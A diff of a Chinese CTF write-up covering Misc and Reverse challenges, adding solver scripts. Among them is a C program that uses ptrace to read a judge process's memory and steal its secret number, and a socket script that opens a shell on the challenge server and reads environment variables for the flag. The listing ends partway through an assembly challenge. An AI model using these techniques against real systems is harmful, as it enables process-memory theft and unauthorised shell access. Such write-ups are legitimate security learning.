@@ -8,42 +8,38 @@ draft: true
 image: "/assets/images/1778682116401.jpeg"
 ---
 
+
+# 题目列表
+
 | 题目类型 | 题目名 | 难度 |
 | :--- | :--- | :--- |
-| 第一天 |||
 | Misc | AAA 真·签到 | 签到 |
-| Web | Hidden Secret | Easy |
-| Crypto | BAGUA | Easy |
-| Crypto | dlp | Normal |
-| Reverse | Assembly_recovery | Normal |
-| Misc | 新年快乐 | Normal |
-| 第二天 |||
-| Blockchain | CVE-2025-55182 | Normal |
-| Reverse | nyah | Normal |
-| Blockchain | WEBWEBWEB | Normal |
-| Crypto | double_crypto | Easy |
 | Misc | 我是谁? | Easy |
-| Forensics | Secret in Chatting | Hard |
-| 第三天 |||
-| Reverse | 入 | Easy |
+| Misc | 新年快乐 | Normal |
 | Misc | 猜猜数字喵 | Hard |
+| Reverse | 入 | Easy |
+| Reverse | Assembly_recovery | Normal |
+| Reverse | nyah | Normal |
 | Pwn | ezstack | Easy |
 | Pwn | ezstring | Easy |
 | Pwn | baseh | Normal |
 | Pwn | nopnopnop | Normal |
-
-
-
-
-# 题目：
+| Crypto | BAGUA | Easy |
+| Crypto | double_crypto | Easy |
+| Crypto | dlp | Normal |
+| Web | Hidden Secret | Easy |
+| Web | CVE-2025-55182 | Normal |
+| Blockchain | WEBWEBWEB | Normal |
+| Forensics | Secret in Chatting | Hard |
 
 ---
+## Misc
 
-## AAA 真签到
+### AAA 真签到
 
 题目说明了：1337 端口对应为进程通信 TCP 转发服务，请通过 Netcat (nc) 及 其他 TCP 通讯工具 进行访问
 
-我首先尝试使用虚拟机的 nc，并打开了桥接模式，但是报错了：
+我首先尝试使用虚拟机的 nc（至于为什么不使用windows的nc，emmm...，后面我才知道windows可以以装nc），并打开了桥接模式，但是报错了：
 
 ```bash
 feng-gjsnw@feng-gjsnw-VMware-Virtual-Platform:~/桌面/$ nc ctf-2.xeed.run 32290
@@ -72,9 +68,6 @@ def sendline(x):
 
 recv()
 
-# 根据题目提示在这里 sendline(...)
-# sendline("answer")
-
 s.close()
 ```
 
@@ -84,9 +77,9 @@ s.close()
 
 然后跟着操作即可
 
-![连接成功！！！](./misc/check_in/发送短信.jpg)
+![发送短信](./misc/check_in/发送短信.jpg)
 
-![连接成功！！！](./misc/check_in/flag01.png)
+![输出flag](./misc/check_in/flag01.png)
 
 于是得到flag:
 
@@ -96,11 +89,176 @@ flag{937ec5ec-c857-49b8-be97-6a50e0e232d1}
 
 ---
 
-## 新年快乐
+### 我是谁?
+
+题目给了一个网址：https://bili33.top/GDUTCSCTF2026-whoami-Cheatsheet
+
+![访问网站](./misc/whoami/web_sheet.png)
+
+图片都是svg的，然后都给出了对应名称。
+
+然后再链接一下靶机，输出了一下内容：
+![连接靶机](./misc/whoami/link_01.png)
+
+结合前面网站，这里应该是将图片编码为一个字符串后发送给答题者，然后答题者需要根据字符串识别出这事那个图片，再发送对应名字，也就是回答问题。
+
+经过尝试，发现图中字符串是由 base(zlib(svg)) 得到的
+
+那只需要将网站上所有图片的svg下载下来，编码过后存储为字符串，然后连接靶机后根据靶机的字符串匹配即可回答问题。
+
+脚本：
+```python
+import socket
+import base64
+import zlib
+import re
+import urllib.request
+import threading
+
+HOST = "ctf-2.xeed.run"
+PORT = 32336
+
+logos = {
+    "android": "Android",
+    "arch": "Arch",
+    "centos": "CentOS",
+    "chromeos": "ChromeOS",
+    "debian": "Debian",
+    "fedora": "Fedora",
+    "kali": "Kali",
+    "macos": "MacOS",
+    "mint": "Mint",
+    "nixos": "NixOS",
+    "opensuse": "OpenSUSE",
+    "redhat": "Redhat",
+    "ubuntu": "Ubuntu",
+    "windows": "Windows",
+}
+
+BASE_URL = "https://bili33.top/img/logo/{}.svg"
+
+
+def download_svg(name):
+    url = BASE_URL.format(name)
+    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+    return urllib.request.urlopen(req, timeout=10).read()
+
+
+def build_refs():
+    refs = {}
+
+    for name, answer in logos.items():
+        svg = download_svg(name)
+
+        token = base64.b64encode(zlib.compress(svg)).decode()
+
+        refs[token] = answer
+        refs[token.rstrip("=")] = answer
+
+        print(f"[+] loaded {answer}")
+
+    return refs
+
+
+def extract_token(text):
+    candidates = re.findall(r"[A-Za-z0-9+/=]{80,}", text)
+    if not candidates:
+        return None
+    return candidates[-1].strip()
+
+
+def interactive(sock):
+    def recv_loop():
+        while True:
+            try:
+                data = sock.recv(4096)
+                if not data:
+                    break
+                print(data.decode(errors="ignore"), end="")
+            except Exception:
+                break
+
+    threading.Thread(target=recv_loop, daemon=True).start()
+
+    while True:
+        try:
+            line = input()
+            sock.sendall(line.encode() + b"\n")
+        except (EOFError, KeyboardInterrupt):
+            break
+
+
+def main():
+    refs = build_refs()
+
+    s = socket.create_connection((HOST, PORT), timeout=10)
+    s.settimeout(3)
+
+    buf = b""
+
+    while True:
+        try:
+            data = s.recv(65536)
+        except socket.timeout:
+            continue
+
+        if not data:
+            break
+
+        buf += data
+        text = buf.decode(errors="ignore")
+        print(text, end="")
+
+        if "Your answer >>" in text:
+            token = extract_token(text)
+
+            if token is None:
+                print("\n[-] token not found")
+                break
+
+            ans = refs.get(token) or refs.get(token.rstrip("="))
+
+            if ans is None:
+                print("\n[-] answer not found")
+                print("[!] token head:", token[:80])
+                break
+
+            print(f"\n[+] answer = {ans}")
+            s.sendall(ans.encode() + b"\n")
+            buf = b""
+
+        elif "Your command >>" in text:
+            print("\n[+] game passed")
+
+            cmd = "sh"
+            print(f"[+] send command: {cmd}")
+            s.sendall(cmd.encode() + b"\n")
+
+            interactive(s)
+            break
+
+
+if __name__ == "__main__":
+    main()
+```
+
+运行后在命令行端尝试ls,chat ./flag等命令，最后使用env | grep -i flag找出来flag了
+
+![flag](./misc/whoami/flag-whoami.png)
+
+flag:
+```
+flag{7489925c-6bdd-4ad1-bb20-eb3751524c1b}
+```
+
+
+---
+
+### 新年快乐
 
 附件下载之后是一个图片
 
-![连接成功！！！](./misc/picture/Challenge.png)
+![二维码](./misc/picture/Challenge.png)
 
 尝试扫描，出现一下内容：
 
@@ -118,6 +276,8 @@ flag{937ec5ec-c857-49b8-be97-6a50e0e232d1}
 
 ![使用DiskGenius进行文件数据查看](./misc/picture/Picture_data.png)
 
+在这里面能看到一些什么Adobe元数据等东西
+
 但是光拿到数据，我还没什么思路，于是在网上搜了搜文章：
 
 [CTF MISC图片题知识点](https://blog.csdn.net/weixin_45696568/article/details/116082336)
@@ -133,7 +293,6 @@ flag{937ec5ec-c857-49b8-be97-6a50e0e232d1}
  P  a  r  t  3  :     H  3  p  p  i
 ```
 
----
 
 根据文章，并问了一下AI，我继续总结了一下文件头：
 ```
@@ -229,7 +388,1747 @@ flag{2026D4yDayH3ppi}
 ---
 
 
-## BAGUA
+### 猜猜数字喵
+
+题目给出了judge的代码：
+```c
+#define _GNU_SOURCE
+#include <err.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/capability.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+typedef uint64_t randval_t;
+
+typedef struct main_context_t {
+    int   pfd[2];
+    pid_t pid;
+} main_context_t;
+
+typedef struct medium_context_t {
+    int   outfd[2];
+    pid_t pid;
+} medium_context_t;
+
+typedef struct config_t { 
+    size_t count; // 次数
+    char*  exe;   // 执行程序名
+} config_t; 
+
+static const config_t* getcfg() {
+    static config_t config = {.count = 32, .exe = "./sol"};
+    static bool     init = false;
+
+    char* buf;
+
+    if (!init) {
+        buf = getenv("JUDGER_COUNT");
+        if (buf != NULL) config.count = atoll(buf);
+
+        buf = getenv("JUDGER_EXE");
+        if (buf != NULL) config.exe = buf;
+    }
+
+    return &config;
+}
+
+static randval_t getrand() {
+    randval_t val;
+
+    FILE*  fp;
+    size_t ret;
+
+    fp = fopen("/dev/urandom", "r");
+    if (fp == NULL) err(EXIT_FAILURE, "fopen");
+
+    ret = fread(&val, sizeof(val), 1, fp);
+    if (ret != 1) {
+        fprintf(stderr, "fread() failed: %zu\n", ret);
+        exit(EXIT_FAILURE);
+    }
+
+    fclose(fp);
+
+    return val;
+}
+
+static void judger(const main_context_t* const ctx,
+                   const randval_t* const      expect) {
+    ssize_t nread;
+
+    randval_t actual;
+
+    if (close(ctx->pfd[1]) == -1) err(EXIT_FAILURE, "close");
+
+    nread = read(ctx->pfd[0], &actual, sizeof(actual));
+    if (nread < 0) err(EXIT_FAILURE, "read");
+    if (nread != sizeof(actual)) {
+        fprintf(stderr, "read() failed: %zd\n", nread);
+        exit(EXIT_FAILURE);
+    }
+
+    if (actual != *expect) {
+        fprintf(stderr, "judge: Number not matched.\n");
+        exit(EXIT_FAILURE);
+    }
+
+    if (close(ctx->pfd[0]) == -1) err(EXIT_FAILURE, "close");
+}
+
+static void proxy(const main_context_t* const   mainctx,
+                  const medium_context_t* const proxyctx) {
+    ssize_t   cnt;
+    randval_t val;
+
+    if (close(mainctx->pfd[0]) == -1) err(EXIT_FAILURE, "close");
+    if (close(proxyctx->outfd[1]) == -1) err(EXIT_FAILURE, "close");
+
+    cnt = read(proxyctx->outfd[0], &val, sizeof(val));
+    if (cnt < 0) err(EXIT_FAILURE, "read");
+    if (cnt != sizeof(val)) {
+        fprintf(stderr, "read() failed: %zd\n", cnt);
+        exit(EXIT_FAILURE);
+    }
+
+    cnt = write(mainctx->pfd[1], &val, sizeof(val));
+    if (cnt < 0) err(EXIT_FAILURE, "write");
+    if (cnt != sizeof(val)) {
+        fprintf(stderr, "write() failed: %zd\n", cnt);
+        exit(EXIT_FAILURE);
+    }
+
+    if (close(mainctx->pfd[1]) == -1) err(EXIT_FAILURE, "close");
+    if (close(proxyctx->outfd[0]) == -1) err(EXIT_FAILURE, "close");
+
+    exit(EXIT_SUCCESS);
+}
+
+static void userprog(const medium_context_t* const ctx) {
+    const config_t* cfg;
+
+    int nullfd;
+
+    int ret;
+
+    char* argv[2];
+    char* envp[1];
+
+    cfg = getcfg();
+
+    if (close(ctx->outfd[0]) == -1) err(EXIT_FAILURE, "close");
+    if (dup2(ctx->outfd[1], STDOUT_FILENO) == -1) err(EXIT_FAILURE, "dup2");
+    if (close(ctx->outfd[1]) == -1) err(EXIT_FAILURE, "close");
+
+    nullfd = open("/dev/null", O_RDONLY);
+    if (nullfd == -1) err(EXIT_FAILURE, "open");
+    if (dup2(nullfd, STDIN_FILENO) == -1) err(EXIT_FAILURE, "dup2");
+    if (close(nullfd) == -1) err(EXIT_FAILURE, "close");
+
+    memcpy(argv, (typeof(argv)){cfg->exe, NULL}, sizeof(argv));
+    envp[0] = NULL;
+
+    ret = execve(cfg->exe, argv, envp);
+    if (ret == -1) err(EXIT_FAILURE, "execve");
+}
+
+static void isolate() {
+    int ret;
+
+    cap_t       caps;
+    cap_value_t cap_list[1];
+
+    ret = unshare(CLONE_NEWUSER);
+    if (ret == -1) err(EXIT_FAILURE, "unshare");
+
+    caps = cap_get_proc();
+    if (caps == NULL) err(EXIT_FAILURE, "cap_get_proc");
+
+    cap_list[0] = CAP_SYS_PTRACE;
+    if (cap_set_flag(caps, CAP_INHERITABLE, 1, cap_list, CAP_SET) == -1)
+        err(EXIT_FAILURE, "cap_set_flag");
+    if (cap_set_proc(caps) == -1) err(EXIT_FAILURE, "cap_set_proc");
+    if (cap_free(caps) == -1) err(EXIT_FAILURE, "cap_free");
+
+    if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, CAP_SYS_PTRACE, 0, 0) == -1)
+        err(EXIT_FAILURE, "prctl");
+}
+
+static void medium(const main_context_t* const mainctx) {
+    int ret;
+
+    medium_context_t proxyctx;
+
+    isolate();
+
+    ret = pipe(proxyctx.outfd);
+    if (ret == -1) err(EXIT_FAILURE, "pipe");
+
+    proxyctx.pid = fork();
+    switch (proxyctx.pid) {
+        case -1:
+            err(EXIT_FAILURE, "fork");
+        case 0:
+            proxy(mainctx, &proxyctx);
+        default:
+            userprog(&proxyctx);
+    }
+
+    exit(EXIT_SUCCESS);
+}
+
+static void waitall() { while (wait(NULL) != -1); }
+
+int main() {
+    const config_t* cfg; // 配置文件
+
+    size_t i;
+    int    ret;
+
+    main_context_t ctx;
+
+    randval_t expect;  // 8字节随机数
+
+    if (prctl(PR_SET_CHILD_SUBREAPER, 1) == -1) err(EXIT_FAILURE, "prctl");
+
+    cfg = getcfg();
+
+    for (i = 0; i < cfg->count; i++) { // 进入次数循环
+        expect = getrand(); // 单轮随机数
+
+        ret = pipe2(ctx.pfd, O_CLOEXEC);
+        if (ret == -1) err(EXIT_FAILURE, "pipe2");
+
+        ctx.pid = fork();
+
+        switch (ctx.pid) {
+            case -1:
+                err(EXIT_FAILURE, "fork");
+            case 0:
+                medium(&ctx);  // 子进程
+            default:
+                judger(&ctx, &expect);  // 父进程
+                waitall();
+        }
+    }
+}
+
+```
+
+先看随机数生成代码，看一下是否能找到漏洞：
+```c
+static randval_t getrand() {
+    randval_t val;
+
+    FILE*  fp;
+    size_t ret;
+
+    fp = fopen("/dev/urandom", "r");
+    if (fp == NULL) err(EXIT_FAILURE, "fopen");
+
+    ret = fread(&val, sizeof(val), 1, fp);
+    if (ret != 1) {
+        fprintf(stderr, "fread() failed: %zu\n", ret);
+        exit(EXIT_FAILURE);
+    }
+
+    fclose(fp);
+
+    return val;
+}
+```
+这里发现本轮需要猜中的随机数 expect，是在 main() 中通过 /dev/urandom 生成的，显然不可能通过伪随机数预测去输出答案。
+
+继续看整个代码设计，可以看到程序中有许多“进程”和“管道”的设计：
+
+提交的程序运行时并不是直接把结果交给 judger()，而是通过一层 proxy 转发，数据流如下：
+
+```text
+program -> proxy -> main judger
+```
+
+
+在浏览的过程中，不难发现 expect = getrand() 发生在 fork() 之前，因此后续 fork 出来的子进程会继承当时的地址空间，即 medium 进程中会存在一份 main() 栈的副本，其中就包含本轮随机数 expect。
+
+随后 medium() 会先调用 isolate() 做环境隔离，并设置 CAP_SYS_PTRACE 能力。
+
+之后它继续 fork()，分离出 proxy 进程和即将执行用户程序的进程。
+
+用户程序这一路会经过 execve("./sol")，因此原来的旧地址空间会被替换掉；但 proxy 进程没有经过 execve，所以它仍然保留着 fork 继承来的旧栈内容，其中就残留着 expect。
+
+所以本题需要利用题目给出的 CAP_SYS_PTRACE 能力，让提交的程序 attach 到自己的子进程 proxy，读取 proxy 的寄存器和内存。
+
+具体做法是从 proxy 当前的 rbp 开始，沿着栈帧链向上回溯，找到 medium() 返回到 main() 的那一层栈帧。根据反汇编可知，expect 位于 main_rbp - 0x20，于是读取该地址即可得到本轮正确随机数。
+
+具体代码：
+```c
+#define _GNU_SOURCE
+#include <ctype.h>
+#include <dirent.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+
+// return address after medium(&ctx) in judge main()
+#define RET_MAIN_AFTER_MEDIUM 0x2030fbULL
+// expect is local variable at main_rbp - 0x20
+#define EXPECT_OFF_FROM_MAIN_RBP 0x20ULL
+
+static int read_file(const char *path, char *buf, size_t sz) {
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) return -1;
+    ssize_t n = read(fd, buf, sz - 1);
+    close(fd);
+    if (n <= 0) return -1;
+    buf[n] = 0;
+    return 0;
+}
+
+static pid_t find_child_once(void) {
+    char path[128], buf[4096];
+    snprintf(path, sizeof(path), "/proc/self/task/%d/children", getpid());
+    if (read_file(path, buf, sizeof(buf)) == 0) {
+        char *p = buf;
+        while (*p && isspace((unsigned char)*p)) p++;
+        if (isdigit((unsigned char)*p)) {
+            long v = strtol(p, NULL, 10);
+            if (v > 1) return (pid_t)v;
+        }
+    }
+
+    DIR *d = opendir("/proc");
+    if (!d) return -1;
+    pid_t self = getpid();
+    struct dirent *de;
+    while ((de = readdir(d)) != NULL) {
+        if (!isdigit((unsigned char)de->d_name[0])) continue;
+        pid_t pid = (pid_t)strtol(de->d_name, NULL, 10);
+        if (pid <= 1 || pid == self) continue;
+        snprintf(path, sizeof(path), "/proc/%d/status", pid);
+        if (read_file(path, buf, sizeof(buf)) != 0) continue;
+        char *pp = strstr(buf, "\nPPid:");
+        if (!pp) continue;
+        long ppid = strtol(pp + 6, NULL, 10);
+        if ((pid_t)ppid == self) {
+            closedir(d);
+            return pid;
+        }
+    }
+    closedir(d);
+    return -1;
+}
+
+static pid_t find_child(void) {
+    struct timespec ts = {0, 1000000};
+    for (int i = 0; i < 2000; i++) {
+        pid_t p = find_child_once();
+        if (p > 0) return p;
+        nanosleep(&ts, NULL);
+    }
+    return -1;
+}
+
+static int peek_u64(pid_t pid, uint64_t addr, uint64_t *out) {
+    errno = 0;
+    long v = ptrace(PTRACE_PEEKDATA, pid, (void *)(uintptr_t)addr, NULL);
+    if (v == -1 && errno != 0) return -1;
+    *out = (uint64_t)(unsigned long)v;
+    return 0;
+}
+
+static int ptrace_get_answer(pid_t pid, uint64_t *answer) {
+    int st = 0;
+    struct user_regs_struct regs;
+
+    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) return -1;
+    if (waitpid(pid, &st, 0) < 0) {
+        ptrace(PTRACE_DETACH, pid, NULL, NULL);
+        return -1;
+    }
+
+    int ok = -1;
+    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == 0) {
+        uint64_t frame = (uint64_t)regs.rbp;
+
+        // Walk frame-pointer chain. The proxy child still keeps:
+        // main -> medium -> proxy/read/fork frames.
+        // The medium frame has return address 0x2030fb, and its saved rbp is main_rbp.
+        for (int depth = 0; depth < 12; depth++) {
+            uint64_t saved_rbp = 0, ret_addr = 0;
+            if (frame < 0x10000) break;
+            if (peek_u64(pid, frame, &saved_rbp) != 0) break;
+            if (peek_u64(pid, frame + 8, &ret_addr) != 0) break;
+
+            if (ret_addr == RET_MAIN_AFTER_MEDIUM) {
+                uint64_t main_rbp = saved_rbp;
+                if (peek_u64(pid, main_rbp - EXPECT_OFF_FROM_MAIN_RBP, answer) == 0)
+                    ok = 0;
+                break;
+            }
+
+            if (saved_rbp <= frame || saved_rbp - frame > 0x100000) break;
+            frame = saved_rbp;
+        }
+    }
+
+    ptrace(PTRACE_DETACH, pid, NULL, NULL);
+    return ok;
+}
+
+int main(void) {
+    uint64_t answer = 0;
+    pid_t child = find_child();
+    if (child > 0) {
+        ptrace_get_answer(child, &answer);
+    }
+    write(STDOUT_FILENO, &answer, sizeof(answer));
+    return 0;
+}
+
+```
+
+---
+
+
+## Reverse
+
+### 入
+
+题目給了一个zako.zo程序，使用winhex查看后发现跟一个叫Racket的东西相关
+
+![线索：Racket](./reverse/zako/winhex.png)
+
+先去官网下一个Racket，但是发现官网上全是cs版本的，而我需要的是bc版本的，于是去linux上编译一个Racket并安装一下：
+(注，cs版本编译报错了)
+
+![编译Racket-9.2[bc]](./reverse/zako/racket编译.png)
+
+然后编译zako.zo:
+
+![编译zako.zo](./reverse/zako/compile.png)
+
+下面运行一些命令检查编译产物：
+```bash
+feng-gjsnw@feng-gjsnw-VMware-Virtual-Platform:/mnt/hgfs/linux_share/ctf-260528/reverse/zako$ echo $?
+ls -lh decompiled-linklet.rkt err.txt
+cat err.txt
+0
+-rwxrwxrwx 1 root root 25K Jun  4 23:03 decompiled-linklet.rkt
+-rwxrwxrwx 1 root root   0 Jun  4 23:03 err.txt
+feng-gjsnw@feng-gjsnw-VMware-Virtual-Platform:/mnt/hgfs/linux_share/ctf-260528/reverse/zako$ head -120 decompiled-linklet.rkt
+(linklet-directory
+ #:name
+ (configure-runtime)
+ #:bundle
+ (linklet-bundle
+  #:key
+  0
+  #:value
+  (linklet
+   (() ())
+   ()
+   '(import-shapes:)
+   '(source-names: #hasheq())
+   (datum-intern-literal '#t)
+   (void))
+  #:key
+  data
+  #:value
+  (linklet
+   ((deserialize-module-path-indexes
+     syntax-module-path-index-shift
+     syntax-shift-phase-level
+     force-syntax-object
+     module-use
+     deserialize))
+   (.mpi-vector)
+   '(import-shapes:)
+   '(source-names: #hasheq())
+   (define-values (.inspector) (current-code-inspector))
+   (define-values
+    (.mpi-vector)
+    (deserialize-module-path-indexes
+     '#(#&(main_gen configure-runtime) #('#%kernel) #(racket/runtime-config))
+     '#(0 1 2))))
+  #:key
+  name
+  #:value
+  '(main_gen configure-runtime)
+  #:key
+  vm
+  #:value
+  '#"racket"
+  #:key
+  side-effects
+  #:value
+  '(0)
+  #:key
+  decl
+  #:value
+  (linklet
+   ((deserialize-module-path-indexes
+     syntax-module-path-index-shift
+     syntax-shift-phase-level
+     force-syntax-object
+     module-use
+     deserialize)
+    (.mpi-vector))
+   (self-mpi
+    requires
+    recur-requires
+    flattened-requires
+    provides
+    phase-to-link-modules
+    portal-stxes)
+   '(import-shapes:)
+   '(source-names: #hasheq())
+   (define-values (self-mpi) (unsafe-vector-set! .mpi-vector '0))
+   (define-values
+    (requires)
+    (let ((local59 '#(#() #() #() #(#:cons #:list 3 0 #:mpi 1 #:mpi 2 ()))))
+      (deserialize
+       .mpi-vector
+       '#f
+       '#f
+       '0
+       (unsafe-vector-set! local59 '0)
+       '0
+       (unsafe-vector-set! local59 '1)
+       (unsafe-vector-set! local59 '2)
+       (unsafe-vector-set! (#%sfs-clear local59) '3))))
+   (define-values (recur-requires) '((#f #t)))
+   (define-values (flattened-requires) '#f)
+   (define-values
+    (provides)
+    (let ((local77 '#(#() #() #() #(#hasheqv()))))
+      (deserialize
+       .mpi-vector
+       '#f
+       '#f
+       '0
+       (unsafe-vector-set! local77 '0)
+       '0
+       (unsafe-vector-set! local77 '1)
+       (unsafe-vector-set! local77 '2)
+       (unsafe-vector-set! (#%sfs-clear local77) '3))))
+   (define-values (phase-to-link-modules) (hasheqv '0 '()))
+   (define-values (portal-stxes) '#hasheq())))
+ #:name
+ ()
+ #:bundle
+ (linklet-bundle
+  #:key
+  0
+  #:value
+  (linklet
+   (() () (displayln) (print-values))
+   (meow meow? numbers_of_cats cats_of_numbers mao chao_da_mao)
+   '(import-shapes:
+     (displayln #s((function-shape zo 0) (1 2) #f))
+     (print-values #s((function-shape zo 0) #(struct:arity-at-least 0) #f)))
+   '(source-names: #hasheq())
+   (define-values
+    (chao_da_mao)
+    (list->bytes
+     (list
+      '114
+      '49
+      '99
+      '107
+      '89
+feng-gjsnw@feng-gjsnw-VMware-Virtual-Platform:/mnt/hgfs/linux_share/ctf-260528/reverse/zako$ grep -nE "mao|chao_da_mao|meow|cats_of_numbers|numbers_of_cats|2654435769|4294967295|1327217880|1327217889" decompiled-linklet.rkt
+107:   (meow meow? numbers_of_cats cats_of_numbers mao chao_da_mao)
+113:    (chao_da_mao)
+133:    (mao)
+193:    (cats_of_numbers)
+195:     cats_of_numbers51
+197:       '#(cats_of_numbers
+211:    (numbers_of_cats)
+213:     numbers_of_cats52
+215:       '#(numbers_of_cats
+229:    (meow?)
+231:     meow?53
+233:       '#(meow?
+247:                  (+ arg1-217 '2654435769))
+249:               '4294967295)))
+257:                    (+ local222 '2654435769))
+259:                 '4294967295)))
+269:                   '4294967295)))
+298:                           (+ (#%sfs-clear arg5-292) '1327217880 '1327217889)
+299:                           '4294967295)))
+309:                             '4294967295)))
+319:                               '4294967295)))
+334:                                     (+ local299 '1327217880 '1327217889)
+335:                                     '4294967295)))
+349:                                       '4294967295)))
+363:                                         '4294967295)))
+388:               '4294967295))))))))
+390:    (meow)
+392:      '#(meow
+509:                                                 '1327217880
+510:                                                 '1327217889)
+511:                                                '4294967295)))
+529:                                                  '4294967295)))
+547:                                                    '4294967295)))
+605:    (if (equal? (meow (string->bytes/utf-8 (read-line)) chao_da_mao) mao)
+606:      (displayln '"meow~")
+feng-gjsnw@feng-gjsnw-VMware-Virtual-Platform:/mnt/hgfs/linux_share/ctf-260528/reverse/zako$ grep -n "114" decompiled-linklet.rkt
+grep -n "163" decompiled-linklet.rkt
+116:      '114
+136:      '163
+173:      '163
+feng-gjsnw@feng-gjsnw-VMware-Virtual-Platform:/mnt/hgfs/linux_share/ctf-260528/reverse/zako$ awk '/\(mao\)/{flag=1; next} flag{print} /\)\)\)/ && flag{flag=0}' decompiled-linklet.rkt \
+| grep -o "'[0-9]\+" \
+| tr -d "'" \
+| awk '{printf "0x%02x, ", $1} END{print ""}'
+0xa3, 0xc0, 0xfc, 0xb3, 0xc8, 0xd6, 0xfa, 0xba, 0x65, 0x39, 0x26, 0x88, 0xc4, 0x99, 0x3f, 0x2a, 0x65, 0xbb, 0x75, 0x0a, 0x7a, 0x12, 0xac, 0xe3, 0xa0, 0x15, 0x32, 0x4c, 0xe9, 0x2d, 0xc4, 0xd6, 0x91, 0xf6, 0x0a, 0x9d, 0x92, 0xa3, 0x57, 0x51, 0x22, 0xf7, 0xf0, 0x81, 0x55, 0xa9, 0xba, 0x87, 0x21, 0x13, 0xf9, 0x49, 0xca, 0x02, 0x8f, 0x41, 
+feng-gjsnw@feng-gjsnw-VMware-Virtual-Platform:/mnt/hgfs/linux_share/ctf-260528/reverse/zako$ 
+```
+
+其中有一个：
+```bash
+(if (equal? (meow (string->bytes/utf-8 (read-line)) chao_da_mao) mao)
+  (displayln '"meow~")
+```
+
+大概意思是：
+```
+读取你输入的一行
+转成 UTF-8 bytes
+调用 meow(input, chao_da_mao)
+如果结果等于 mao
+    输出 meow~
+否则
+    输出 HA!!!
+```
+
+所以chao_da_mao 是 key，而 mao是密文。
+
+其中 chao_da_mao = r1ckY_15_4_n3k0!
+
+mao则是上面命令行输出的最后一坨东西：
+```
+0xa3, 0xc0, 0xfc, 0xb3, 0xc8, 0xd6, 0xfa, 0xba, 0x65, 0x39, 0x26, 0x88, 0xc4, 0x99, 0x3f, 0x2a, 0x65, 0xbb, 0x75, 0x0a, 0x7a, 0x12, 0xac, 0xe3, 0xa0, 0x15, 0x32, 0x4c, 0xe9, 0x2d, 0xc4, 0xd6, 0x91, 0xf6, 0x0a, 0x9d, 0x92, 0xa3, 0x57, 0x51, 0x22, 0xf7, 0xf0, 0x81, 0x55, 0xa9, 0xba, 0x87, 0x21, 0x13, 0xf9, 0x49, 0xca, 0x02, 0x8f, 0x41, 
+```
+
+然后写python脚本解密：
+```python
+key = b"r1ckY_15_4_n3k0!"
+
+ct = bytes([
+    0xa3, 0xc0, 0xfc, 0xb3, 0xc8, 0xd6, 0xfa, 0xba,
+    0x65, 0x39, 0x26, 0x88, 0xc4, 0x99, 0x3f, 0x2a,
+    0x65, 0xbb, 0x75, 0x0a, 0x7a, 0x12, 0xac, 0xe3,
+    0xa0, 0x15, 0x32, 0x4c, 0xe9, 0x2d, 0xc4, 0xd6,
+    0x91, 0xf6, 0x0a, 0x9d, 0x92, 0xa3, 0x57, 0x51,
+    0x22, 0xf7, 0xf0, 0x81, 0x55, 0xa9, 0xba, 0x87,
+    0x21, 0x13, 0xf9, 0x49, 0xca, 0x02, 0x8f, 0x41,
+])
+
+DELTA = 0x9E3779B9
+MASK = 0xFFFFFFFF
+
+def u32be(b):
+    return int.from_bytes(b, "big")
+
+def p32be(x):
+    return x.to_bytes(4, "big")
+
+def tea_decrypt_block(v0, v1, k):
+    s = (DELTA * 32) & MASK
+
+    for _ in range(32):
+        v1 = (v1 - (((v0 << 4) + k[2]) ^ (v0 + s) ^ ((v0 >> 5) + k[3]))) & MASK
+        v0 = (v0 - (((v1 << 4) + k[0]) ^ (v1 + s) ^ ((v1 >> 5) + k[1]))) & MASK
+        s = (s - DELTA) & MASK
+
+    return v0, v1
+
+k = [u32be(key[i:i + 4]) for i in range(0, 16, 4)]
+
+out = b""
+
+for i in range(0, len(ct), 8):
+    v0 = u32be(ct[i:i + 4])
+    v1 = u32be(ct[i + 4:i + 8])
+    a, b = tea_decrypt_block(v0, v1, k)
+    out += p32be(a) + p32be(b)
+
+print("[raw]")
+print(out)
+
+pad = out[-1]
+flag = out[:-pad]
+
+print("[flag]")
+print(flag.decode())
+```
+
+flag:
+![flag](./reverse/zako/flag.png)
+
+
+
+
+
+
+
+### Assembly_recovery
+
+文件打开就吓哭了，全是汇编了......
+
+```asm
+; ============================================================================
+; A suspicious DOS program was recovered from a 1990s BBS archive.
+; The code is full of nonsensical instructions and dead ends —
+; clearly someone tried to hide something inside. find it.
+; ============================================================================
+
+    BITS  16
+    ORG   100h
+
+off_0100:
+    push    cs
+    pop     ds
+    push    cs
+    pop     es
+
+    mov     ax, 0x1337
+    mov     bx, 0x0DEF
+    mov     cx, 0xBEEF
+    mov     dx, 0xC0DE
+    mul     cx
+    add     ax, bx
+    ror     ax, 4
+    xor     ah, 0xAB
+    xor     ax, ax
+    xor     bx, bx
+    xor     cx, cx
+    xor     dx, dx
+
+    mov     al, 0x37
+
+    xchg    ax, cx
+    xchg    ax, cx
+
+    add     al, 0x13
+
+    cmp     bx, 0
+    je      .L1
+    mov     al, 0xFF
+.L1:
+
+    push    ax
+    pushf
+    pop     ax
+    pop     ax
+
+    stc
+    clc
+
+    xor     al, 0x1F
+
+    mov     bl, al
+
+    mov     al, 0xAA
+    shr     al, 1
+    xor     al, al
+
+    mov     cx, 0x100
+    shl     cx, 4
+    xor     cx, cx
+
+    mov     ax, off_063B
+    push    ax
+    ret
+
+off_015B:
+        db 0x24, 0x32, 0x22, 0x76, 0x5B, 0x56, 0x44, 0x5C
+        db 0x53, 0x51, 0x5D, 0x5C, 0x40, 0x52, 0x45, 0x46
+        db 0x42, 0x5E, 0x58, 0x47, 0x5B, 0x5C, 0x5D, 0x5F
+        db 0x50, 0x51, 0x53, 0x44, 0x56, 0x4D, 0x4F, 0x54
+
+off_017B:
